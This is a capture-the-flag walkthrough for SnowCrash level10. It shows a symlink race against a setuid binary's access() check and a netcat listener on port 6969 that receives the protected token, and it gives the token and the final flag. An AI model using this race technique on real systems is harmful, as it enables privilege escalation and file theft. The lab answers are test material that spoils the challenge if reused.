### Level10

Again we have an executable and a file named token. If I run the program with or without the token I always get the same result:

`./level10 file host sends file to host if you have access to it`

To find out more I look at `level10` with `strings` and I get 2 very important pieces of information. 

First we can see that the program makes a call to `access` which makes it vulnerable as the man tells us:
```
Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.   For this reason, the use of this system call should be avoided. (In the example just described, a safer alternative would be to temporarily switch the process effective user ID to the real ID and then call open(2).
```

Then I could learn that the program connects to port `6969`.

To get the flag I have to open the token through a symbolic link created with another file on my HOME. So I automate the process of creating the symbolic link and calling `./level10` with while in my shell:
```
level10@SnowCrash:~$ chmod 777 . && touch test
(while true; do ln -sf test tmp; ln -sf token tmp; done)&
level10@SnowCrash:~$ while true; do ./level10 tmp 127.0.0.1; done
Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
You don't have access to tmp
Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
```

Then in another shell I listen on the port with the following command:

`while true; do nc -l 6969; done`

So I quickly see the contents of the token: `woupa2yuojeeaaed06riuj63c`

We just have to connect to the flag10 with this password and launch the getflag command

You get the flag!
> feulo4b72j7edeahuete3no7c
